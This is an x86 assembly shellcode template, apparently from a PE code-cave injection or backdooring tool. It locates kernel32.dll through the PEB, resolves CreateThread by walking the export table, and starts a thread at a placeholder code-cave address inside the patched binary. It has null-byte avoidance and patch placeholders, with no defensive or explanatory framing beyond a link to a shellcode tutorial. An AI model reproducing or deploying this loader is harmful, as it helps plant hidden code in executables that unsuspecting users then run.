; calculate image base
call next
next: pop eax   ; eax = eip
sub eax, :FIRST_INSTR_ADDR:
sub eax, 4      ; len('call next') = 4
                ; EAX = IMAGE_BASE


; based on https://idafchev.github.io/exploit/2017/09/26/writing_windows_shellcode.html

; Establish a new stack frame
push ebp
mov ebp, esp

sub esp, 0x27 			; Allocate memory on stack for local variables
mov [ebp-0x18], eax     ; var24 = IMAGE_BASE

; push the function name on the stack
; CreateThread in reverse: 0x43726561 0x74655468 0x72656164
xor esi, esi
push esi			; null termination
push 0x64616572
push 0x68546574
push 0x61657243
mov [ebp-4], esp 		; var4 = "CreateThread\x00"

; Find kernel32.dll base address
xor esi, esi			; esi = 0
    mov ebx, [fs:0x30 + esi]  	; written this way to avoid null bytes
mov ebx, [ebx + 0x0C] 
mov ebx, [ebx + 0x14] 
mov ebx, [ebx]	
mov ebx, [ebx]	
mov ebx, [ebx + 0x10]		; ebx holds kernel32.dll base address
mov [ebp-8], ebx 		; var8 = kernel32.dll base address

; Find CreateThread address
mov eax, [ebx + 0x3C]		; RVA of PE signature
add eax, ebx       		; Address of PE signature = base address + RVA of PE signature
mov eax, [eax + 0x78]		; RVA of Export Table
add eax, ebx 			; Address of Export Table

mov ecx, [eax + 0x24]		; RVA of Ordinal Table
add ecx, ebx 			; Address of Ordinal Table
mov [ebp-0x0C], ecx 		; var12 = Address of Ordinal Table

mov edi, [eax + 0x20] 		; RVA of Name Pointer Table
add edi, ebx 			; Address of Name Pointer Table
mov [ebp-0x10], edi 		; var16 = Address of Name Pointer Table

mov edx, [eax + 0x1C] 		; RVA of Address Table
add edx, ebx 			; Address of Address Table
mov [ebp-0x14], edx 		; var20 = Address of Address Table

mov edx, [eax + 0x14] 		; Number of exported functions

xor eax, eax 			; counter = 0

.loop:
    mov edi, [ebp-0x10] 	; edi = var16 = Address of Name Pointer Table
    mov esi, [ebp-4] 	; esi = var4 = "CreateThread\x00"
    xor ecx, ecx

    cld  			; set DF=0 => process strings from left to right
    mov edi, [edi + eax*4]	; Entries in Name Pointer Table are 4 bytes long
                ; edi = RVA Nth entry = Address of Name Table * 4
    add edi, ebx       	; edi = address of string = base address + RVA Nth entry
    add cx, 13 		; Length of strings to compare (len('CreateThread') = 13)
    repe cmpsb        	; Compare the first 13 bytes of strings in 
                ; esi and edi registers. ZF=1 if equal, ZF=0 if not
    jz .found

    inc eax 		; counter++
    cmp eax, edx    	; check if last function is reached
    jb .loop 		; if not the last -> loop

    add esp, 0x2f      		
    jmp .end 		; if function is not found, jump to end

.found:
    ; the counter (eax) now holds the position of CreateThread

    mov ecx, [ebp-0x0C]	; ecx = var12 = Address of Ordinal Table
    mov edx, [ebp-0x14]  	; edx = var20 = Address of Address Table

    mov ax, [ecx + eax*2] 	; ax = ordinal number = var12 + (counter * 2)
    mov eax, [edx + eax*4] 	; eax = RVA of function = var20 + (ordinal * 4)
    add eax, ebx 		; eax = address of CreateThread = 
                        ; = kernel32.dll base address + RVA of CreateThread

; Calling CreateThread here
    push 0                            ; lpThreadId
    push 0                            ; dwCreationFlags
    push 0                            ; lpParameter
    mov ebx, [ebp-0x18]               ; ebx = IMAGE_BASE
    add ebx, :CODE_CAVE_ADDR:         ; ebx = CODE_CAVE_ADDRESS AVA
    push ebx                          ; lpStartAddress
    push 0          ; dwStackSize
    push 0          ; lpThreadAttributes
    call eax 		; CreateThread

    add esp, 0x2f		; clear the stack

.end:
